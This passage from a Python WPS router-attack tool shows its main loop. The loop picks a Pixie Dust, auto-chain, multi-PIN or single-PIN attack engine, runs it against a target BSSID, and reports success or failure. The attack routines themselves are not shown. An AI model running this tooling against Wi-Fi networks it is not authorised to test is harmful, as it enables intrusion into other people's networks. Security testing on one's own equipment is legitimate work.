                elif args.auto:
                    engine = AutoChainEngine(companion, args.show_pixie_cmd,
                                             args.pixie_force, True)
                elif args.multi_pin:
                    engine = MultiPinEngine(companion)
                elif args.pixie_dust:
                    engine = PixieDustEngine(companion, args.show_pixie_cmd, args.pixie_force)
                elif args.bssid and args.pin:
                    engine = SinglePinEngine(companion, args.pin)
                elif args.bssid:
                    engine = MultiPinEngine(companion)
                else:
                    UI.err('No target specified')
                    break

                if args.pbc:
                    success = engine.run()
                else:
                    if not args.bssid:
                        UI.err('No BSSID specified')
                        break
                    success = engine.run(args.bssid)

                if success:
                    UI.ok('Attack succeeded!')
                else:
                    UI.err('Attack failed')
                    # Show why
                    if companion.connection_status.wps_disabled:
                        UI.warn('Reason: WPS is disabled on router firmware')
                    elif companion.connection_status.wps_unreachable:
                        UI.warn('Reason: Router not responding to WPS')

                if not args.loop:
                    break
                try:
                    companion.cleanup()
                except Exception:
                    pass
                companion = None
                args.bssid = None

            except KeyboardInterrupt:
                if args.loop:
                    if input(f'\n{UI.CYAN}[?] Exit? [N/y]: {UI.RESET}').lower() == 'y':
                        UI.warn('Aborting…')
                        break
                    args.bssid = None
                else:
                    UI.plain()
                    UI.warn('Aborting…')
                    break
    finally:
        if companion is not None:
            try:
                companion.cleanup()
            except Exception:
                pass

    if args.iface_down:
        ifaceUp(args.interface, down=True)
    if args.mtk_wifi:
        wmt.write_text('0')

    sys.exit(exit_code)
